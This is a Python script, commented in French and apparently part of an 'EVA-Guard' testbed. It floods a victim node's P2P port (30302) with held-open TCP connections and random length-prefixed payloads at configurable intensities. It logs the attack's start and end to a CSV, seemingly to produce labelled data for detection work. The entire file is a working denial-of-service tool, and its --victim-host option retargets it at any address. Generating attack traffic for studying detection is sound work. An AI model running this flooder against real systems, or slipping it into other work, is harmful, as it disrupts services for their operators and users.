#!/usr/bin/env python3
"""EVA-Guard - DoS par flooding P2P sur le nœud victime."""
import argparse, csv, os, random, socket, struct, threading, time
from datetime import datetime

VICTIM_P2P_PORT = 30302

INTENSITIES = {
    "low":    {"threads": 10,  "rate": 0.20},
    "medium": {"threads": 40,  "rate": 0.05},
    "high":   {"threads": 100, "rate": 0.01},
}

stop = threading.Event()
stats = {"syn_sent": 0, "syn_err": 0, "msg_sent": 0, "msg_err": 0}
lock = threading.Lock()
VICTIM_HOST = "127.0.0.1"


def bump(key):
    with lock:
        stats[key] += 1


def syn_worker(rate):
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((VICTIM_HOST, VICTIM_P2P_PORT))
            bump("syn_sent")
            time.sleep(random.uniform(1, 4))
            s.close()
        except Exception:
            bump("syn_err")
        time.sleep(random.expovariate(1 / max(rate, 0.001)))


def msg_worker(rate):
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((VICTIM_HOST, VICTIM_P2P_PORT))
            for _ in range(20):
                if stop.is_set():
                    break
                size = random.randint(32, 512)
                payload = struct.pack(">I", size) + os.urandom(size)
                s.sendall(payload)
                bump("msg_sent")
                time.sleep(random.expovariate(1 / max(rate, 0.001)))
            s.close()
        except Exception:
            bump("msg_err")
        time.sleep(random.uniform(0.05, 0.2))


def report_loop(duration):
    start = time.time()
    while not stop.is_set() and time.time() - start < duration:
        time.sleep(15)
        with lock:
            print(f"{datetime.now():%H:%M:%S} {stats}")


def main():
    global VICTIM_HOST
    ap = argparse.ArgumentParser()
    ap.add_argument("--intensity", choices=list(INTENSITIES), default="medium")
    ap.add_argument("--duration", type=int, default=180)
    ap.add_argument("--mode", choices=["syn", "msg", "both"], default="both")
    ap.add_argument("--run-id", default=None)
    ap.add_argument("--victim-host", default="127.0.0.1")
    args = ap.parse_args()
    VICTIM_HOST = args.victim_host

    cfg = INTENSITIES[args.intensity]
    n, rate = cfg["threads"], cfg["rate"]

    run_id = args.run_id or f"{datetime.now():%Y%m%d_%H%M%S}"
    os.makedirs("data/raw", exist_ok=True)
    log_path = f"data/raw/attack_{run_id}.csv"
    log_file = open(log_path, "w", newline="")
    log_writer = csv.writer(log_file)
    log_writer.writerow(["timestamp", "event", "attack", "intensity", "mode"])

    print(f"DoS P2P : run_id={run_id} intensité={args.intensity} threads={n} "
          f"mode={args.mode} duree={args.duration}s cible={VICTIM_HOST}:{VICTIM_P2P_PORT}")

    log_writer.writerow([datetime.now().isoformat(timespec="seconds"), "start",
                         "dos_p2p", args.intensity, args.mode])
    log_file.flush()

    threads, targets = [], []
    if args.mode in ("syn", "both"):
        targets.append(syn_worker)
    if args.mode in ("msg", "both"):
        targets.append(msg_worker)

    per_target = max(1, n // len(targets))
    for fn in targets:
        for _ in range(per_target):
            t = threading.Thread(target=fn, args=(rate,), daemon=True)
            t.start()
            threads.append(t)

    threading.Thread(target=report_loop, args=(args.duration,), daemon=True).start()

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("\nArrêt demandé.")
    stop.set()
    time.sleep(2)

    log_writer.writerow([datetime.now().isoformat(timespec="seconds"), "end",
                         "dos_p2p", args.intensity, args.mode])
    log_file.close()
    print("Flood terminé :", stats)
    print("Journal d'attaque :", log_path)


if __name__ == "__main__":
    main()
